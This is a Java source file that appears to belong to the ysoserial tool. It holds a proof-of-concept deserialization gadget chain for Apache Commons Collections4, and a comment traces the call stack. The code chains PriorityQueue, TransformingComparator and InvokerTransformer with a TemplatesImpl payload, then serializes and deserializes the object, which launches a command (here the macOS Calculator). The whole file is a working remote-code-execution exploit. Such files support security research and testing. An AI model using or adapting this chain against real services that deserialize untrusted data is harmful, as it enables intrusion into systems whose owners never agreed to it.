package ysoserial.payloads.tabbyGadgetChains.CommonCollections4;


import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;

/**
 * readObject:795, PriorityQueue (java.util)
 * heapify:736, PriorityQueue (java.util)
 * siftDown:687, PriorityQueue (java.util)
 * siftDownUsingComparator:721, PriorityQueue (java.util)
 * compare:81, TransformingComparator (org.apache.commons.collections4.comparators)
 * transform:129, InvokerTransformer (org.apache.commons.collections4.functors)
 * invoke:487, Method (java.lang.reflect) [2]
 */

public class CC4_Poc1 {
    public static void main(String[] args) throws Exception {
        Object templatesImpl = Gadgets.createTemplatesImpl("/Applications/Calculator.app/Contents/MacOS/Calculator");
        InvokerTransformer transformer = new InvokerTransformer("toString",
                new Class[]{},
                new Object[]{}
                );
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));

        queue.add(1);
        queue.add(2);

        Reflections.setDeclaredField(transformer, "iMethodName", "newTransformer");

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templatesImpl;
        queueArray[1] = 1;

        //         serialize
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(bout);
        oout.writeObject(queue);
        oout.close();
        //         deserialize
        ObjectInputStream oin = new ObjectInputStream(new ByteArrayInputStream(bout.toByteArray()));
        oin.readObject();



    }
}
